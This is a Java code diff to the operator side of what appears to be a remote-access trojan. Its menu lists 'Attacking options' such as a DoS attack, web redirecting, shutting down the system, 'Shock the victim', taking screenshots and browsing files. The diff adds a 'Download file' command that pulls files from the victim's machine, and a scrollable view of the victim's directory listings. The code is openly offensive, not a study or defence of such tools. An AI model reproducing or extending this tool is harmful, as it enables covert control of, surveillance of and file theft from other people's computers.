@@ -3,6 +3,8 @@ import java.util.*;
 
 import javax.swing.JFrame;
 import javax.swing.JOptionPane;
+import javax.swing.JScrollPane;
+import javax.swing.JTextArea;
 
 import java.io.*;
 public class Server {
@@ -34,7 +36,7 @@ public class Server {
 			dout = new DataOutputStream(s.getOutputStream());
 			br = new BufferedReader(new InputStreamReader(System.in));
 			
-			while(option<9){
+			while(option<10){
 				
 				if(option == 1){
 					dout.writeUTF("dos");
@@ -99,9 +101,19 @@ public class Server {
 				if(option == 8){
 					send = ao.fileExplore(j);
 					dout.writeUTF(send);
-					recive = din.readUTF();
-					JOptionPane.showMessageDialog(j, recive);
+					recive = din.readUTF(); 
+					JTextArea ta = new JTextArea(20, 50);
+	                ta.setText(recive);
+	                ta.setWrapStyleWord(true);
+	                ta.setLineWrap(true);
+	                ta.setCaretPosition(0);
+	                ta.setEditable(false);
+	                JOptionPane.showMessageDialog(null, new JScrollPane(ta), "directory", JOptionPane.INFORMATION_MESSAGE);  
 					
+				}
+				
+				if(option == 9){
+					ao.fileDownload(j, din, dout);
 				}
 				
 
@@ -127,7 +139,7 @@ public class Server {
 		int choise = 0;
 		try{
 			String option="";
-			String options = "\nAttacking options:\n\n1: Dos Attack\n2: Web redirecting\n3: Shutdown the system\n4: chat with client\n5: Shock the victim\n6: Fun light script\n7: take screenshot\n8: file exploration\n\nEnter your choise:\n";
+			String options = "\nAttacking options:\n\n1: Dos Attack\n2: Web redirecting\n3: Shutdown the system\n4: chat with client\n5: Shock the victim\n6: Fun light script\n7: take screenshot\n8: file exploration\n9: Download file\n\nEnter your choise:\n";
 			option = JOptionPane.showInputDialog(j,options);
 			choise= Integer.parseInt(option);
 		}
